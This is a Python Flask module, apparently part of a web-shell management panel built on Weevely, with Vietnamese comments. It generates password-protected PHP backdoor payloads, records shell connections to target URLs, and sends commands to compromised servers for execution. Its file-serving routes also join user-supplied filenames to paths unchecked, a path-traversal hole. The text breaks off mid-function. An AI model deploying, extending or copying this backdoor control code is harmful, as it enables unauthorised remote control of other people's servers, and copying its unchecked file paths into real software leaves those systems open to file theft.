# -*- encoding: utf-8 -*-
"""
Copyright (c) 2019 - present AppSeed.us
"""

import os
import uuid
import subprocess
import hashlib
import math
from datetime import datetime
from flask import render_template, jsonify, request, current_app
from apps.weevely import blueprint
from apps.models import ShellConnection, ShellCommand, ShellStatus, ShellType, db, DataFile
from apps.exceptions.exception import InvalidUsage

import datetime as dt

# File extensions allowed for upload/download

def get_folder_file_upload():
    """Get upload folder path"""
    return os.path.join(current_app.root_path, '..', 'dataserver', 'uploads')

def get_folder_file_download():
    """Get download folder path"""
    return os.path.join(current_app.root_path, '..', 'dataserver', 'downloads')

#Chức năng download file và upload file lên server từ CLIENT request
@blueprint.route('/api/weevely/list-file', methods=['GET'])
def list_file():
    """List all files in the upload folder"""
    try:
        search_query = request.args.get('search', '', type=str).strip()
        folder_type = request.args.get('folder', 'upload')
        
        files = DataFile.search_files(search_query, folder_type)

        # Chuyển đổi thành format phù hợp cho frontend
        file_list = []
        for file_obj in files:
            file_info = {
                'id': file_obj.file_id,
                'name': file_obj.file_name,
                'size': file_obj.file_size,
                'size_readable': file_obj.get_file_size_readable(),
                'type': file_obj.file_type,
                'hash': file_obj.file_hash,
                'uploaded_at': file_obj.file_created_at.strftime('%Y-%m-%d %H:%M:%S') if file_obj.file_created_at else 'Unknown',
                'path': file_obj.local_path
            }
            file_list.append(file_info)

        return jsonify({'status': '1', 'files': file_list})

    except Exception as e:
        return jsonify({'error': str(e)}), 500

#lấy tất cả thông tin về file đã download
@blueprint.route('/api/weevely/list-file-download', methods=['GET'])
def list_filedownload():
    """List all files in the download folder"""
    try:
        download_folder = get_folder_file_download()
        if not os.path.exists(download_folder):
            os.makedirs(download_folder, exist_ok=True)
        
        files = []
        for filename in os.listdir(download_folder):
            file_path = os.path.join(download_folder, filename)
            if os.path.isfile(file_path):
                file_stat = os.stat(file_path)
                files.append({
                    'name': filename,
                    'size': file_stat.st_size,
                    'modified': datetime.fromtimestamp(file_stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
                    'path': file_path
                })
        
        return jsonify({'files': files})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# Lấy danh sách file upload từ database
@blueprint.route('/api/weevely/list-file-upload', methods=['GET'])
def list_fileupload():
    """List all uploaded files from database"""
    try:
        search_query = request.args.get('search', '', type=str).strip()
        
        # Lấy danh sách file từ database
        files = DataFile.search_files(search_query, 'upload', limit=100)
        
        # Chuyển đổi thành format phù hợp cho frontend
        file_list = []
        for file_obj in files:
            file_info = {
                'id': file_obj.file_id,
                'name': file_obj.file_name,
                'size': file_obj.file_size,
                'size_readable': file_obj.get_file_size_readable(),
                'type': file_obj.file_type,
                'hash': file_obj.file_hash,
                'uploaded_at': file_obj.file_created_at.strftime('%Y-%m-%d %H:%M:%S') if file_obj.file_created_at else 'Unknown',
                'path': file_obj.local_path
            }
            file_list.append(file_info)
        
        return jsonify({'status': '1', 'files': file_list})
    except Exception as e:
        return jsonify({'status': '0', 'error': str(e)}), 500



def get_unique_filename(folder, filename):
    name, ext = os.path.splitext(filename)
    counter = 1
    new_filename = filename

    while os.path.exists(os.path.join(folder, new_filename)):
        new_filename = f"{name}({counter}){ext}"
        counter += 1

    return new_filename

#upload file lên server => OKKKKKKKKKKKKKKKKKKKKKKKKKKK
@blueprint.route('/api/weevely/upload-file', methods=['POST'])
def upload_file_to_server():
    try:
        file = request.files['file']
        if file and file.filename:
            file_name = get_unique_filename(get_folder_file_upload(), file.filename)           
            
            # Lưu file trước
            file.save(os.path.join(get_folder_file_upload(), file_name))            
            
            # Định nghĩa local_path trước khi sử dụng
            local_path = os.path.join(get_folder_file_upload(), file_name)
            
            # Tính file size
            file_size = os.path.getsize(local_path)  # Lấy size theo bytes
            file_size_kb = file_size / 1024  # Chuyển sang KB
            
            # Tính hash SHA256
            sha256_hash = hashlib.sha256()
            with open(local_path, "rb") as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    sha256_hash.update(chunk)
            file_hash = sha256_hash.hexdigest()

            source_path = ""
            local_path_db = os.path.join('..', 'dataserver', 'uploads', file_name) # Đường dẫn để lưu vào DB
            file_type = "upload"
            shell_conn = ""
            #datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')
            file_created_at = dt.datetime.utcnow() 
            file_updated_at = dt.datetime.utcnow() 
            
            #Lưu file vào database
            data_file = DataFile(
                file_name=file_name,
                source_path=source_path,
                local_path=local_path_db,
                file_type=file_type,
                file_size=file_size_kb,
                file_hash=file_hash,
                connection_id=shell_conn,
                file_created_at=file_created_at,
                file_updated_at=file_updated_at
            )   
            print(f"[+] Data file: {data_file}")
            db.session.add(data_file)
            db.session.commit()

            return jsonify({'status': '1', 'msg': 'File uploaded successfully', 'file_name': file.filename})
        else:
            return jsonify({'status': '-1', 'msg': 'No file provided'}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 500


#view one file có thể dùng chung được cho cả upload và download
@blueprint.route('/api/weevely/view-file', methods=['GET'])
def view_file():
    """View content of a specific file - can read any file type intelligently"""
    try:
        filename = request.args.get('filename')
        folder_type = request.args.get('folder', 'upload')  # 'upload' or 'download'
        
        if not filename:
            return jsonify({'error': 'Filename is required'}), 400
        
        if folder_type == 'upload':
            folder_path = get_folder_file_upload()
        else:
            folder_path = get_folder_file_download()
        
        file_path = os.path.join(folder_path, filename)
        
        if not os.path.exists(file_path):
            return jsonify({'error': 'File not found'}), 404
        
        file_stat = os.stat(file_path)
        file_size = file_stat.st_size
        file_ext = os.path.splitext(filename)[1].lower()
        
        # Kiểm tra file size để tránh load file quá lớn
        MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB limit
        if file_size > MAX_FILE_SIZE:
            return jsonify({
                'status': '1',
                'filename': filename,
                'content': f'[File too large to view]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes ({file_size / (1024*1024):.2f} MB)\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nFile is too large to display. Please download it instead.',
                'type': 'large_file',
                'size': file_size,
                'lines': 'N/A',
                'warning': 'File too large to view'
            })
        
        # Định nghĩa các loại file và cách xử lý
        text_extensions = {
            '.txt', '.py', '.js', '.html', '.css', '.php', '.java', '.md', '.json', '.xml', 
            '.sql', '.log', '.conf', '.ini', '.cfg', '.yml', '.yaml', '.sh', '.bat', '.ps1',
            '.c', '.cpp', '.h', '.hpp', '.cs', '.vb', '.go', '.rs', '.swift', '.kt', '.scala',
            '.r', '.m', '.pl', '.rb', '.lua', '.tcl', '.awk', '.sed', '.tex', '.rst', '.adoc'
        }
        
        image_extensions = {'.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff', '.webp', '.svg', '.ico'}
        archive_extensions = {'.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.lzma'}
        document_extensions = {'.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods', '.odp'}
        audio_extensions = {'.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a'}
        video_extensions = {'.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.m4v'}
        
        # Xử lý text files
        if file_ext in text_extensions:
            try:
                # Thử với UTF-8 trước
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                return jsonify({
                    'status': '1',
                    'filename': filename,
                    'content': content,
                    'type': 'text',
                    'size': file_size,
                    'size_readable': f"{file_size / 1024:.2f} KB" if file_size < 1024*1024 else f"{file_size / (1024*1024):.2f} MB",
                    'lines': len(content.splitlines()),
                    'encoding': 'UTF-8',
                    'file_type': 'Text File'
                })
            except UnicodeDecodeError:
                # Thử với các encoding khác
                encodings = ['latin-1', 'cp1252', 'iso-8859-1', 'utf-16', 'utf-8-sig']
                for encoding in encodings:
                    try:
                        with open(file_path, 'r', encoding=encoding) as f:
                            content = f.read()
                        return jsonify({
                            'status': '1',
                            'filename': filename,
                            'content': content,
                            'type': 'text',
                            'size': file_size,
                            'size_readable': f"{file_size / 1024:.2f} KB" if file_size < 1024*1024 else f"{file_size / (1024*1024):.2f} MB",
                            'lines': len(content.splitlines()),
                            'encoding': encoding,
                            'file_type': 'Text File'
                        })
                    except:
                        continue
                
                # Nếu không đọc được với encoding nào, thử đọc binary và hiển thị hex
                try:
                    with open(file_path, 'rb') as f:
                        binary_data = f.read(min(file_size, 1024))  # Chỉ đọc 1KB đầu
                    
                    hex_content = binary_data.hex()
                    hex_lines = [hex_content[i:i+32] for i in range(0, len(hex_content), 32)]
                    hex_display = '\n'.join(hex_lines)
                    
                    return jsonify({
                        'status': '1',
                        'filename': filename,
                        'content': f'[Binary file - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nFirst 1KB in HEX:\n{hex_display}',
                        'type': 'binary_hex',
                        'size': file_size,
                        'size_readable': f"{file_size / 1024:.2f} KB" if file_size < 1024*1024 else f"{file_size / (1024*1024):.2f} MB",
                        'lines': 'Binary',
                        'file_type': 'Binary File (HEX View)'
                    })
                except Exception as e:
                    return jsonify({'error': f'Cannot read file content: {str(e)}'}), 500
        
        # Xử lý image files
        elif file_ext in image_extensions:
            try:
                # Đọc header của image để lấy thông tin
                with open(file_path, 'rb') as f:
                    header = f.read(16)
                
                # Tạo thông tin chi tiết về image
                image_info = f'[Image File - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes ({file_size / (1024*1024):.2f} MB)\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nImage Details:\n- Format: {file_ext.upper()}\n- Header (hex): {header.hex()[:32]}...\n\nNote: This is a binary image file. Use download button to save it.'
                
                return jsonify({
                    'status': '1',
                    'filename': filename,
                    'content': image_info,
                    'type': 'image',
                    'size': file_size,
                    'size_readable': f"{file_size / (1024*1024):.2f} MB",
                    'lines': 'Binary Image',
                    'file_type': 'Image File',
                    'download_url': f'/api/weevely/download-file?filename={filename}&folder={folder_type}'
                })
            except Exception as e:
                return jsonify({'error': f'Cannot read file content: {str(e)}'}), 500
        # Xử lý archive files
        elif file_ext in archive_extensions:
            archive_info = f'[Archive File - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes ({file_size / (1024*1024):.2f} MB)\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nArchive Details:\n- Format: {file_ext.upper()}\n- Compressed size: {file_size} bytes\n\nNote: This is a compressed archive file. Use download button to save it.'
            
            return jsonify({
                'status': '1',
                'filename': filename,
                'content': archive_info,
                'type': 'archive',
                'size': file_size,
                'size_readable': f"{file_size / (1024*1024):.2f} MB",
                'lines': 'Compressed Archive',
                'file_type': 'Archive File',
                'download_url': f'/api/weevely/download-file?filename={filename}&folder={folder_type}'
            })
        
        # Xử lý document files
        elif file_ext in document_extensions:
            doc_info = f'[Document File - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes ({file_size / (1024*1024):.2f} MB)\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nDocument Details:\n- Format: {file_ext.upper()}\n- Size: {file_size} bytes\n\nNote: This is a document file. Use download button to save it.'
            
            return jsonify({
                'status': '1',
                'filename': filename,
                'content': doc_info,
                'type': 'document',
                'size': file_size,
                'size_readable': f"{file_size / (1024*1024):.2f} MB",
                'lines': 'Document',
                'file_type': 'Document File',
                'download_url': f'/api/weevely/download-file?filename={filename}&folder={folder_type}'
            })
        
        # Xử lý audio files
        elif file_ext in audio_extensions:
            audio_info = f'[Audio File - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes ({file_size / (1024*1024):.2f} MB)\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nAudio Details:\n- Format: {file_ext.upper()}\n- Size: {file_size} bytes\n\nNote: This is an audio file. Use download button to save it.'
            
            return jsonify({
                'status': '1',
                'filename': filename,
                'content': audio_info,
                'type': 'audio',
                'size': file_size,
                'size_readable': f"{file_size / (1024*1024):.2f} MB",
                'lines': 'Audio',
                'file_type': 'Audio File',
                'download_url': f'/api/weevely/download-file?filename={filename}&folder={folder_type}'
            })
        
        # Xử lý video files
        elif file_ext in video_extensions:
            video_info = f'[Video File - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes ({file_size / (1024*1024):.2f} MB)\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nVideo Details:\n- Format: {file_ext.upper()}\n- Size: {file_size} bytes\n\nNote: This is a video file. Use download button to save it.'
            
            return jsonify({
                'status': '1',
                'filename': filename,
                'content': video_info,
                'type': 'video',
                'size': file_size,
                'size_readable': f"{file_size / (1024*1024):.2f} MB",
                'lines': 'Video',
                'file_type': 'Video File',
                'download_url': f'/api/weevely/download-file?filename={filename}&folder={folder_type}'
            })
        
        # Xử lý các file khác (binary files)
        else:
            try:
                # Đọc một phần đầu của file để phân tích
                with open(file_path, 'rb') as f:
                    binary_data = f.read(min(file_size, 512))  # Chỉ đọc 512 bytes đầu
                
                # Kiểm tra xem có phải là text file không (dù extension không phải text)
                try:
                    text_content = binary_data.decode('utf-8', errors='ignore')
                    # Nếu có ít nhất 70% là printable characters thì coi như text
                    printable_chars = sum(1 for c in text_content if c.isprintable() or c in '\n\r\t')
                    if printable_chars / len(text_content) > 0.7:
                        return jsonify({
                            'status': '1',
                            'filename': filename,
                            'content': f'[Text-like file - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nContent (first 512 bytes):\n{text_content}',
                            'type': 'text_like',
                            'size': file_size,
                            'size_readable': f"{file_size / 1024:.2f} KB" if file_size < 1024*1024 else f"{file_size / (1024*1024):.2f} MB",
                            'lines': 'Unknown',
                            'file_type': 'Text-like File'
                        })
                except Exception:
                    pass
                
                # Hiển thị dưới dạng hex
                hex_content = binary_data.hex()
                hex_lines = [hex_content[i:i+32] for i in range(0, len(hex_content), 32)]
                hex_display = '\n'.join(hex_lines)
                
                binary_info = f'[Binary File - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes ({file_size / (1024*1024):.2f} MB)\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nBinary Analysis:\n- File type: Unknown binary\n- First 512 bytes in HEX:\n{hex_display}\n\nNote: This is a binary file. Use download button to save it.'
                
                return jsonify({
                    'status': '1',
                    'filename': filename,
                    'content': binary_info,
                    'type': 'binary',
                    'size': file_size,
                    'size_readable': f"{file_size / (1024*1024):.2f} MB",
                    'lines': 'Binary',
                    'file_type': 'Binary File',
                    'download_url': f'/api/weevely/download-file?filename={filename}&folder={folder_type}'
                })
                
            except Exception as e:
                return jsonify({
                    'status': '1',
                    'filename': filename,
                    'content': f'[Unknown File Type - {file_ext.upper()}]\n\nFile Information:\n- Name: {filename}\n- Size: {file_size} bytes\n- Type: {file_ext.upper()}\n- Modified: {datetime.fromtimestamp(file_stat.st_mtime)}\n\nError reading file: {str(e)}\n\nNote: Cannot read this file type. Use download button to save it.',
                    'type': 'unknown',
                    'size': file_size,
                    'size_readable': f"{file_size / (1024*1024):.2f} MB",
                    'lines': 'Unknown',
                    'file_type': 'Unknown File Type',
                    'download_url': f'/api/weevely/download-file?filename={filename}&folder={folder_type}'
                })
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# API để xem nội dung file upload từ database
@blueprint.route('/api/weevely/view-upload-file', methods=['GET'])
def view_upload_file():
    """View content of an uploaded file by ID"""
    try:
        file_id = request.args.get('id')
        
        # Lấy thông tin file từ database
        file_obj = DataFile.get_by_id(file_id)
        
        # Kiểm tra xem file có tồn tại trên disk không
        upload_folder = get_folder_file_upload()
        file_path = os.path.join(upload_folder, file_obj.file_name)
        
        if not os.path.exists(file_path):
            return jsonify({'error': 'File not found on disk'}), 404
        
        # Kiểm tra xem file có phải là text file không
        text_extensions = {
                            '.txt', '.py', '.js', '.ts', '.jsx', '.tsx', '.html', '.htm', '.css', '.scss', '.sass',
                            '.php', '.java', '.md', '.json', '.xml', '.sql', '.log', '.conf', '.ini', '.cfg',
                            '.sh', '.bat', '.yml', '.yaml', '.rb', '.go', '.c', '.cpp', '.h', '.hpp', '.rs'
                        }
        file_ext = os.path.splitext(file_obj.file_name)[1].lower()
        
        if file_ext in text_extensions:
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    content = f.read()
                #print(f"[+] Content: {content}")
                return jsonify({
                    'status': '1',
                    'filename': file_obj.file_name,
                    'content': content,
                    'type': 'text',
                    'size': file_obj.file_size,
                    'size_readable': file_obj.get_file_size_readable(),
                    'lines': len(content.splitlines()),
                    'uploaded_at': file_obj.file_created_at.strftime('%Y-%m-%d %H:%M:%S') if file_obj.file_created_at else 'Unknown',
                    'hash': file_obj.file_hash
                })
            except UnicodeDecodeError:
                # Thử với encoding khác
                try:
                    with open(file_path, 'r', encoding='latin-1') as f:
                        content = f.read()
                    return jsonify({
                        'status': '1',
                        'filename': file_obj.file_name,
                        'content': content,
                        'type': 'text',
                        'size': file_obj.file_size,
                        'size_readable': file_obj.get_file_size_readable(),
                        'lines': len(content.splitlines()),
                        'uploaded_at': file_obj.file_created_at.strftime('%Y-%m-%d %H:%M:%S') if file_obj.file_created_at else 'Unknown',
                        'hash': file_obj.file_hash
                    })
                except:
                    return jsonify({'error': 'Cannot read file content'}), 500
        else:
            # Binary file
            file_stat = os.stat(file_path)
            return jsonify({
                'status': '1',
                'filename': file_obj.file_name,
                'content': f'[Binary file - {file_ext.upper()}]\n\nFile Information:\n- Name: {file_obj.file_name}\n- Size: {file_obj.get_file_size_readable()}\n- Type: {file_ext.upper()}\n- Uploaded: {file_obj.file_created_at.strftime("%Y-%m-%d %H:%M:%S") if file_obj.file_created_at else "Unknown"}\n- Hash: {file_obj.file_hash}',
                'type': 'binary',
                'size': file_obj.file_size,
                'size_readable': file_obj.get_file_size_readable(),
                'lines': 'Binary',
                'uploaded_at': file_obj.file_created_at.strftime('%Y-%m-%d %H:%M:%S') if file_obj.file_created_at else 'Unknown',
                'hash': file_obj.file_hash
            })
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# API để xóa file upload
@blueprint.route('/api/weevely/delete-upload-file', methods=['DELETE'])
def delete_upload_file():
    """Delete an uploaded file by ID"""
    try:
        file_id = request.args.get('id')
        if not file_id:
            return jsonify({'error': 'File ID is required'}), 400
        
        # Lấy thông tin file từ database
        file_obj = DataFile.get_by_id(file_id)
        if not file_obj:
            return jsonify({'error': 'File not found'}), 404
        
        # Xóa file trên disk
        upload_folder = get_folder_file_upload()
        file_path = os.path.join(upload_folder, file_obj.file_name)
        
        if os.path.exists(file_path):
            os.remove(file_path)
        
        # Xóa record từ database
        file_obj.delete_file()
        
        return jsonify({'status': '1', 'msg': 'File deleted successfully'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# API để download file upload
@blueprint.route('/api/weevely/download-upload-file', methods=['GET'])
def download_upload_file():
    """Download an uploaded file by ID"""
    try:
        file_id = request.args.get('id')
        if not file_id:
            return jsonify({'error': 'File ID is required'}), 400
        
        # Lấy thông tin file từ database
        file_obj = DataFile.get_by_id(file_id)
        if not file_obj:
            return jsonify({'error': 'File not found'}), 404
        
        # Kiểm tra xem file có tồn tại trên disk không
        upload_folder = get_folder_file_upload()
        file_path = os.path.join(upload_folder, file_obj.file_name)
        
        if not os.path.exists(file_path):
            return jsonify({'error': 'File not found on disk'}), 404
        
        # Trả về file để download
        from flask import send_file
        return send_file(
            file_path,
            as_attachment=True,
            download_name=file_obj.file_name,
            mimetype='application/octet-stream'
        )
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

#Xoa file
@blueprint.route('/api/weevely/delete-download-file', methods=['DELETE'])
def delete_download_file():
    """Delete a specific file"""
    try:
        filename = request.args.get('filename')
        folder_type = request.args.get('folder', 'upload')  # 'upload' or 'download'
        
        if not filename:
            return jsonify({'error': 'Filename is required'}), 400
        
        if folder_type == 'upload':
            folder_path = get_folder_file_upload()
        else:
            folder_path = get_folder_file_download()
        
        file_path = os.path.join(folder_path, filename)
        
        if not os.path.exists(file_path):
            return jsonify({'error': 'File not found'}), 404
        
        if not os.path.isfile(file_path):
            return jsonify({'error': 'Not a file'}), 400
        
        # Delete the file
        os.remove(file_path)
        
        return jsonify({
            'status': 'success',
            'message': f'File {filename} deleted successfully'
        })
        
    except PermissionError:
        return jsonify({'error': 'Permission denied'}), 403
    except Exception as e:
        return jsonify({'error': str(e)}), 500

#tải file về máy client
@blueprint.route('/api/weevely/download-download-file', methods=['GET'])
def download_file():
    """Download a specific file"""
    try:
        filename = request.args.get('filename')
        folder_type = request.args.get('folder', 'upload')  # 'upload' or 'download'
        
        if not filename:
            return jsonify({'error': 'Filename is required'}), 400
        
        if folder_type == 'upload':
            folder_path = get_folder_file_upload()
        else:
            folder_path = get_folder_file_download()
        
        file_path = os.path.join(folder_path, filename)
        
        if not os.path.exists(file_path):
            return jsonify({'error': 'File not found'}), 404
        
        if not os.path.isfile(file_path):
            return jsonify({'error': 'Not a file'}), 400
        
        # Import Flask send_file for file download
        from flask import send_file
        
        return send_file(
            file_path,
            as_attachment=True,
            download_name=filename,
            mimetype='application/octet-stream'
        )
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500






# ==========================================
# ADVANCED WEEVELY PAYLOAD & MODULE APIs
# ==========================================
from apps.weevely.module_executor import WeevelyModuleExecutor, WeevelyPayloadGenerator
from apps.models import ShellConnection, ShellType, ShellStatus


# Initialize components
executor = WeevelyModuleExecutor()
payload_generator = WeevelyPayloadGenerator()
  
@blueprint.route('/weevely', methods=['GET'])
def weevely():
    """Main weevely management page"""
    return render_template('weevely/index-weevely.html', segment='index_weevely')

@blueprint.route('/api/weevely', methods=['GET'])
def get_weevely_connections():
    """Get and search weevely connections list"""
    try:
        page = request.args.get('page', 1, type=int)
        search_query = request.args.get('search', '', type=str).strip()
        sort_type = request.args.get('sort', '', type=str).strip()
        per_page = 7
        
        print(f"[x]LIST-WEEVELY page: {page} & search_query={search_query} & sort_type={sort_type}")
        
        # Filter only WEBSHELL type connections for weevely
        weevely_connections, total_pages = ShellConnection.search(search_query, page, per_page, sort_type)
        # Filter to only show WEBSHELL type
        if weevely_connections:
            weevely_connections = [conn for conn in weevely_connections if conn.shell_type == ShellType.WEBSHELL]
        
        html = render_template('weevely/partial-list-weevely.html', weevely_connections=weevely_connections, loader=0)
        
        return jsonify({
            'html': html,
            'total_pages': total_pages
        })
    except Exception as e:
        print(f"Error in get_weevely_connections: {str(e)}")
        return jsonify({'error': 'Server error', 'details': str(e)}), 500

# ==========================================
# PAYLOAD GENERATION => Tạo payload và lưu vào CSDL ĐÃ THÀNH CÔNGGGGGGG
# ==========================================
@blueprint.route('/api/weevely/create-weevely-payload', methods=['POST'])
def create_weevely_payload():
    """Tạo weevely payload"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        filename = data.get('filename') + '.php'
        password = data.get('password')
        #print(f"[+] Create Weevely Payload Data: {filename} & {password}")

        if not filename or not password:
            return jsonify({'status': 'error', 'message': 'Filename and password required'}), 400
        
        result = payload_generator.create(filename, password)
        if result['success']:
            '''Nếu tạo được payloadf rồi thì ta sẽ nó vào CSDL'''

            local_path_db = os.path.join('..', 'dataserver', 'uploads', filename) # Đường dẫn để lưu vào DB
            file_size = os.path.getsize(os.path.join(get_folder_file_upload(), filename))  # Lấy size theo bytes
            file_size_kb = file_size / 1024  # Chuyển sang KB
            
            # Tính hash SHA256
            sha256_hash = hashlib.sha256()
            with open(os.path.join(get_folder_file_upload(), filename), "rb") as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    sha256_hash.update(chunk)
            file_hash = sha256_hash.hexdigest()
            # Tạo connection mới
            datafile = DataFile(                
                file_name=filename,
                source_path= '',
                local_path= local_path_db,
                file_type='upload',
                file_size=file_size_kb,
                file_hash=file_hash,
                connection_id='',
                file_created_at=datetime.now(),
                file_updated_at=datetime.now(),
                password=password
            )
            
            db.session.add(datafile)
            db.session.commit()
            
            return jsonify({
                'status': '1',
                'data': result
            })
        else:
            return jsonify({
                'status': '-1',
                'data': result
            })
        
    except Exception as e:
        print(f"[##] Error in create_weevely_payload: {str(e)}")
        return jsonify({'message': str(e)}), 500

@blueprint.route('/api/add_weevely', methods=['POST'])
def add_weevely():
    """Add new weevely connection"""
    try:
        data = request.get_json()
        print(f"Add Weevely Data: {data}")
        
        if not data:
            return jsonify({'status': '-1', 'message': 'No input data provided'}), 400
        
        # Validate required fields
        required_fields = ['name', 'password', 'target_url']
        for field in required_fields:
            if not data.get(field):
                return jsonify({'status': '-1', 'message': f'Field {field} is required'}), 400
        
        # Generate unique ID
        connection_id = str(uuid.uuid4())
        
        # Extract optional fields
        target_hostname = data.get('target_hostname', '')
        target_ip = data.get('target_ip', '')
        notes = data.get('notes', '')
        
        # Create weevely connection using ShellConnection with WEBSHELL type
        shell_conn = ShellConnection.create_connection(
            connection_id=connection_id,
            name=data['name'],
            shell_type=ShellType.WEBSHELL,
            url=data['target_url'],
            hostname=target_hostname,
            remote_ip=target_ip,
            status=ShellStatus.CLOSED,
            notes=f"Weevely Password: {data['password']}\n{notes}"
        )
        
        return jsonify({
            'status': '1',
            'message': 'Weevely connection created successfully',
            'weevely_id': connection_id,
            'data': shell_conn.to_dict()
        })
        
    except Exception as e:
        print(f"Error in add_weevely: {str(e)}")
        return jsonify({'status': '-1', 'message': 'Server error', 'details': str(e)}), 500

@blueprint.route('/api/weevely/<weevely_id>', methods=['DELETE'])
def delete_weevely(weevely_id):
    """Delete weevely connection"""
    try:
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn or shell_conn.shell_type != ShellType.WEBSHELL:
            return jsonify({'status': 'error', 'message': 'Weevely connection not found'}), 404
        
        # Clean up generated backdoor files if they exist in downloads folder
        backdoor_dir = os.path.join(current_app.root_path, '..', 'downloads', 'weevely_backdoors')
        potential_files = [
            os.path.join(backdoor_dir, f'weevely_{weevely_id[:8]}.php'),
            os.path.join(backdoor_dir, f'{shell_conn.name.replace(" ", "_")}.php')
        ]
        
        for file_path in potential_files:
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                except OSError:
                    pass  # File might be in use or permission issue
        
        shell_conn.delete()
        
        return jsonify({
            'status': 'success',
            'message': 'Weevely connection deleted successfully'
        })
        
    except Exception as e:
        print(f"Error in delete_weevely: {str(e)}")
        return jsonify({'status': 'error', 'message': 'Server error', 'details': str(e)}), 500

def extract_password_from_notes(notes):
    """Extract weevely password from notes field"""
    if not notes:
        return None
    lines = notes.split('\n')
    for line in lines:
        if line.startswith('Weevely Password: '):
            return line.replace('Weevely Password: ', '').strip()
    return None



def extract_password_from_notes(notes):
    """Extract password from notes field"""
    if not notes:
        return None
    # Simple extraction - you can improve this
    lines = notes.split('\n')
    for line in lines:
        if 'password:' in line.lower():
            return line.split(':', 1)[1].strip()
    return None



# ==========================================
# CONNECTION & SESSION
# ==========================================

@blueprint.route('/<weevely_id>/test', methods=['POST'])
def test_connection(weevely_id):
    """Test kết nối weevely"""
    try:
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn or shell_conn.shell_type != ShellType.WEBSHELL:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        result = executor.test_connection(shell_conn.url, password)
        
        if result['success']:
            shell_conn.update_status(ShellStatus.CONNECTED)
        
        return jsonify({
            'status': 'success' if result['success'] else 'error',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@blueprint.route('/<weevely_id>/session/info', methods=['GET'])
def get_session_info(weevely_id):
    """Lấy thông tin session"""
    try:
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        result = executor.get_session_info(shell_conn.url, password)
        
        return jsonify({
            'status': 'success' if result else 'error',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ==========================================
# MODULE EXECUTION
# ==========================================

@blueprint.route('/<weevely_id>/execute', methods=['POST'])
def execute_module(weevely_id):
    """Thực thi module command"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
        
        shell_conn = ShellConnection.get_by_id(weevely_id)
        if not shell_conn:
            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
        
        password = extract_password_from_notes(shell_conn.notes)
        if not password:
            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
        
        command = data.get('command')
        timeout = data.get('timeout', 60)
        retries = data.get('retries', 1)
        
        if not command:
            return jsonify({'status': 'error', 'message': 'Command required'}), 400
        
        result = executor.execute_module(shell_conn.url, password, command, timeout, retries)
        
        return jsonify({
            'status': 'success' if result['success'] else 'error',
            'data': result
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@blueprint.route('/<weevely_id>/batch', methods=['POST'])
def batch_execute(weevely_id):
    """Thực thi nhiều command"""
    try:
        data = request.get_json()
        if not data:
